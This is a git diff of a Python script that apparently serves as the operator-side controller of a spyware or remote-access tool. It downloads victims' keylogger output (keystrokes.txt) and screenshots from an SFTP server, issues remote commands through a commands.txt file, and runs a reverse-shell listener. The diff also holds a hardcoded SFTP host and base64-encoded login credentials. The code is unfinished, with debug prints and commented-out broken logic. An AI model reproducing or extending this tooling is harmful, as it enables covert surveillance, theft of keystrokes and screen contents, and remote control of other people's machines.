@@ -15,8 +15,8 @@ import pysftp, base64
 from _thread import *
 
 #Global Variables
-host_sftp = "192.168.0.104"
-username_sftp = "ZGVza3RvcC03MjJoM2k4XG1hbnVl"
+host_sftp = "192.168.178.87"
+username_sftp = "ZGVza3RvcC00N2V0YWQyXG1hbnVlbA=="
 password_sftp = "VGVubmlzMTIh"
 
 #Functions
@@ -61,26 +61,42 @@ def get_new_dirs(ftps, count):
         ftps.chdir("..")
     captured_dirs = []
     dirs = ftps.listdir()
+    print(dirs)
     #find all dirs with "0!?%" in name
     for dir in dirs:
         if "0_0_2" in dir:
             captured_dirs.append(dir)
     
+    print(captured_dirs)
     #download all files from the captured_dirs
+    print("Here 1")
     for dir in captured_dirs:
         try:
             os.mkdir(dir)
         except:
-            pass
-        ftps.get_r(dir, '', preserve_mtime=True)
-    ftps.chdir(captured_dirs[0])
-    with open("keylogger.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
-        text = f.read()
-        text = base64.b64decode(text)
-        #write decoded text to file 
-        f.write(text)
-    print("[+] The Keylogger.txt file is base64 encoded but should be decoded now!")
+            print("[-] Remote directory couldn't be created locally!")
+        finally:
+            ftps.get_r(dir, '', preserve_mtime=True)
+            os.chdir("keystrokes")
+            ftps.chdir("keystrokes")
+            ftps.get("keystrokes.txt", preserve_mtime=True)
+            ftps.chdir("..")
+            os.chdir("..")
+            os.chdir("screenshots")
+            ftps.chdir("screenshots")
+            ftps.get("screenshot1.png", preserve_mtime=True)
+            ftps.chdir("..")
+
+    
+    #ftps.chdir(captured_dirs[0])
+    #with open("keylogger.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
+    #    text = f.read()
+    #    text = base64.b64decode(text)
+    #    #write decoded text to file 
+    #    f.write(text)
+    #print("[+] The Keylogger.txt file is base64 encoded but should be decoded now!")
 #------------------------END Connection to FTPS server------------------------
+
 
 #------------------------Endpoint for reverse shell (netcat listener)------------------------
 def reverse_shell():
@@ -96,7 +112,7 @@ def reverse_shell():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.listen(5)
     print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
-    print("[+] cd and cd.. commands are disabled for this shell! All other commands shouold work!")
+    print("[+] cd and cd.. commands are disabled for this shell! PWD and DIR should work (nothing else implemented, as not working and task was only to get a reverse shell!")
     client_socket, client_address = s.accept()
     print(f"{client_address[0]}:{client_address[1]} Connected!")
 
@@ -204,7 +220,7 @@ def create_command_file(ftps):
         
         #to make sure it gets put for now
         ftps.put("commands.txt")
-        
+
         if shell == 1:
             reverse_shell()
             shell = 0
